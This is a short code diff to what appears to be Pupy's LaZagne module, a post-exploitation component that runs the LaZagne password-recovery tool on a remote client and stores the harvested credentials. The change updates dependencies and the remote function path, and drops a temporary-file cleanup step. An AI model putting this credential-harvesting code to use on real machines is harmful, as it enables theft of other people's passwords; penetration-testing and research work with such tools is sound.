@@ -17,8 +17,7 @@ class LaZagne(PupyModule):
     dependencies = {
         'all': [
             'whole', 'sqlite3', 'xml', 'calendar',
-            'memorpy', 'ConfigParser', 'construct',
-            'lazagne', 'laZagne', 'pyasn1'
+            'ConfigParser', 'lazagne', 'pyasn1'
         ],
         'linux': [
             'secretstorage', 'crypt'
@@ -64,7 +63,7 @@ class LaZagne(PupyModule):
         db = Credentials(client=self.client, config=self.config)
 
         whole = self.client.remote('whole', 'to_strings_list', False)
-        runLaZagne = self.client.remote('laZagne', 'runLaZagne', False)
+        runLaZagne = self.client.remote('lazagne.config.run', 'run_lazagne', False)
 
         first_user = True
         passwordsFound = False
@@ -95,12 +94,6 @@ class LaZagne(PupyModule):
 
         if not passwordsFound:
             self.warning('no passwords found !')
-
-        # clean temporary file if present
-        try:
-            self.client.conn.modules['laZagne'].clean_temporary_files()
-        except AttributeError:
-            pass
 
     def print_module_title(self, module):
         self.log(Color(u'------------------- {} -------------------'.format(module), 'yellow'))
